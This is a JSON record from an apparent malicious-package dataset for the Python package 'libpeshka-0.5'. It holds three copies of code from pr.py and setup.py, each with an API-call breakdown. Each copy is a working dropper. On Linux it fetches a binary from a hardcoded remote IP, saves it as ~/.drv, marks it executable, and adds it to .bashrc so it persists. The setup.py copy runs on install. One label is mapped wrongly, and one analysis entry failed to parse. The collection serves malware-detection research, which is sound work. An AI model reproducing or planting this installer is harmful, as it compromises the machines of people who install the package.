[
  {
    "pyfile": "pr.py",
    "code_snippet": "import platform\nimport urllib2\nimport os, stat\n\ndef rn ():\n    ADD_LOC = \"http://145.249.104.71/out\"\n    LOC = \".drv\"\n\n    if platform.system () == \"Linux\":\n        response = urllib2.urlopen (ADD_LOC)\n        os.chdir (os.path.expanduser (\"~\"))\n        d = open (LOC, \"wb\")\n        d.write (response.read ())\n        d.close ()\n\n        current_state = os.stat (LOC)\n        os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n        brc = open (\".bashrc\", \"a\")\n        brc.write (\"\\n~/.drv &\")\n        brc.close ()\n\n    else:\n        print (\"Error installing library!\")\n        exit (-1)",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "urllib2.urlopen",
        "os.path.expanduser",
        "os.chdir",
        "open",
        "open.write",
        "open.close",
        "os.stat",
        "os.chmod",
        "open",
        "open.write",
        "open.close",
        "print",
        "exit"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "urllib2.urlopen(ADD_LOC)",
        "os.path.expanduser(\"~\")",
        "os.chdir(os.path.expanduser(\"~\"))",
        "open(LOC, \"wb\")",
        "d.write(response.read())",
        "d.close()",
        "os.stat(LOC)",
        "os.chmod(LOC, current_state.st_mode|stat.S_IEXEC)",
        "open(\".bashrc\", \"a\")",
        "brc.write(\"\\n~/.drv &\")",
        "brc.close()",
        "print(\"Error installing library!\")",
        "exit(-1)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "urllib2.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.chmod",
          "id": "change_file_mode_execute",
          "description": "Changes file mode to add execute permission",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_attribute_management"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "print",
          "id": "log_info",
          "description": "Logs informational message",
          "first_id": "data_exfiltration",
          "second_id": "data_collection_operations",
          "third_id": "data_acquisition"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "import platform\nimport urllib2\nimport os, stat\n\ndef rn ():\n    ADD_LOC = \"http://145.249.104.71/out\"\n    LOC = \".drv\"\n\n    if platform.system () == \"Linux\":\n        response = urllib2.urlopen (ADD_LOC)\n        os.chdir (os.path.expanduser (\"~\"))\n        d = open (LOC, \"wb\")\n        d.write (response.read ())\n        d.close ()\n\n        current_state = os.stat (LOC)\n        os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n        brc = open (\".bashrc\", \"a\")\n        brc.write (\"\\n~/.drv &\")\n        brc.close ()\n\n    else:\n        print (\"Error installing library!\")\n        exit (-1)"
    }
  },
  {
    "pyfile": "pr.py",
    "code_snippet": "def rn ():\n        import platform\n\n        lb = False\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n        import os, stat\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC)\n                        response = response.content\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "urllib2.urlopen",
        "urllib2.urlopen.read",
        "requests.get",
        "os.path.expanduser",
        "os.chdir",
        "open",
        "open.write",
        "open.close",
        "os.stat",
        "os.chmod",
        "open",
        "open.write",
        "open.close",
        "exit"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "urllib2.urlopen(ADD_LOC)",
        "urllib2.urlopen(ADD_LOC).read()",
        "requests.get(ADD_LOC)",
        "os.path.expanduser(\"~\")",
        "os.chdir(os.path.expanduser(\"~\"))",
        "open(LOC, \"wb\")",
        "d.write(response)",
        "d.close()",
        "os.stat(LOC)",
        "os.chmod(LOC, current_state.st_mode|stat.S_IEXEC)",
        "open(\".bashrc\", \"a\")",
        "brc.write(\"\\n~/.drv &\")",
        "brc.close()",
        "exit(-1)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "urllib2.urlopen",
          "id": "open_url_get",
          "description": "Opens URL with GET parameters",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "urllib2.urlopen.read",
          "id": "read_response_body",
          "description": "Reads response body from HTTP response",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "response_processing"
        },
        {
          "api_name": "requests.get",
          "id": "send_http_get",
          "description": "Sends HTTP GET request with parameters and timeout",
          "first_id": "basic_network_operations",
          "second_id": "http_requests",
          "third_id": "request_sending"
        },
        {
          "api_name": "os.path.expanduser",
          "id": "path_special_operations",
          "description": "Special path operations (home directory expansion, temporary directory path, executable path, directory tree generation)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.chdir",
          "id": "change_working_dir",
          "description": "Changes current working directory",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "environment_information"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "os.stat",
          "id": "path_object_operations",
          "description": "Path object and status operations (creating Path objects, retrieving file status)",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_path_operations"
        },
        {
          "api_name": "os.chmod",
          "id": "change_file_mode_execute",
          "description": "Changes file mode to add execute permission",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_attribute_management"
        },
        {
          "api_name": "open",
          "id": "combined_mode_operations",
          "description": "Combined mode file opening operations (read-write mode, append mode, etc.)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "open.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "def rn():\n    import platform\n    lb = False\n    try:\n        import urllib2\n    except ImportError:\n        import requests\n        lb = True\n    import os, stat\n    ADD_LOC = \"http://145.249.104.71/out\"\n    LOC = \".drv\"\n    if platform.system() == \"Linux\":\n        response = \"\"\n        if not lb:\n            response = urllib2.urlopen(ADD_LOC).read()\n        else:\n            response = requests.get(ADD_LOC)\n            response = response.content\n        os.chdir(os.path.expanduser(\"~\"))\n        d = open(LOC, \"wb\")\n        d.write(response)\n        d.close()\n        current_state = os.stat(LOC)\n        os.chmod(LOC, current_state.st_mode|stat.S_IEXEC)\n        brc = open(\".bashrc\", \"a\")\n        brc.write(\"\\n~/.drv &\")\n        brc.close()\n    else:\n        print(\"Error installing library!\")\n        exit(-1)\n\nrn()"
    }
  },
  {
    "pyfile": "setup.py",
    "code_snippet": "import platform\nimport os, stat\n\ndef rn ():\n        lb = False\n        try:\n                import urllib2\n        except ImportError:\n                import requests\n                lb = True\n\n        ADD_LOC = \"http://145.249.104.71/out\"\n        LOC = \".drv\"\n\n        if platform.system () == \"Linux\":\n                response = \"\"\n                if not lb:\n                        response = urllib2.urlopen(ADD_LOC).read ()\n                else:\n                        response = requests.get (ADD_LOC)\n                        response = response.content\n                os.chdir (os.path.expanduser (\"~\"))\n                d = open (LOC, \"wb\")\n                d.write (response)\n                d.close ()\n\n                current_state = os.stat (LOC)\n                os.chmod (LOC, current_state.st_mode|stat.S_IEXEC)\n\n                brc = open (\".bashrc\", \"a\")\n                brc.write (\"\\n~/.drv &\")\n                brc.close ()\n\n        else:\n                print (\"Error installing library!\")\n                exit (-1)\n\nrn ()",
    "pattern_analysis": {
      "error": "JSON解析错误",
      "raw_response": "",
      "api_sequence": [],
      "api_sequence_with_args": [],
      "mapped_sequence": [],
      "contextual_code": ""
    }
  },
  {
    "metadata": {
      "package_name": "libpeshka-0.5"
    }
  }
]